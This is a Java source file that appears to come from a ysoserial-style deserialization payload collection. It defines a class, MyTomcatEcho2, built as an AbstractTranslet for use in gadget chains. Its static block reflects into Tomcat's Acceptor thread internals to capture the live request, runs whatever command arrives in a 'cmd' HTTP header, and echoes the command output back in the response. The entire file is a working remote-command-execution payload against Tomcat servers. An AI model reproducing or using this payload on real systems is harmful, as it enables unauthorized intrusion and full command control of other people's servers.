package com.ding0x0.yso.payloads;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.coyote.Request;
import org.apache.coyote.RequestInfo;
import org.apache.coyote.Response;

import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;

public class MyTomcatEcho2 extends AbstractTranslet {

    static {
        try {
            final Method m = Thread.class.getDeclaredMethod("getThreads", (Class<?>[]) new Class[0]);
            m.setAccessible(true);
            final Thread[] threads = (Thread[]) m.invoke(null, new Object[0]);
            for (Thread th :
                    threads) {
                if (th.getName().contains("http") && th.getName().contains("Acceptor")) {
                    Field targetF = th.getClass().getDeclaredField("target");
                    targetF.setAccessible(true);
                    Object target = targetF.get(th);
                    Field this$0F = target.getClass().getDeclaredField("this$0");
                    this$0F.setAccessible(true);
                    Object this$0 = this$0F.get(target);
                    Field handlerF = this$0.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                    handlerF.setAccessible(true);
                    Object handler = handlerF.get(this$0);
                    Field globalF = handler.getClass().getDeclaredField("global");
                    globalF.setAccessible(true);
                    Object global = globalF.get(handler);
                    Field processorsF = global.getClass().getDeclaredField("processors");
                    processorsF.setAccessible(true);
                    ArrayList<RequestInfo> processors = (ArrayList<RequestInfo>) processorsF.get(global);
                    RequestInfo request = processors.get(0);
                    Field reqF = request.getClass().getDeclaredField("req");
                    reqF.setAccessible(true);
                    Request req = (Request) reqF.get(request);
                    org.apache.catalina.connector.Request request1 = (org.apache.catalina.connector.Request) req.getNote(1);
                    Writer writer =  request1.getResponse().getWriter();
                    String cmd = req.getHeader("cmd");
                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                    StringBuilder sb = new StringBuilder("");
                    byte[] bytes = new byte[1024];
                    int line = 0;
                    while ((line = inputStream.read(bytes))!=-1){
                        sb.append(new String(bytes,0,line));
                    }
                    writer.write(sb.toString());
                    writer.flush();
                    System.out.println(req.getClass().getName());

                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {

    }
}
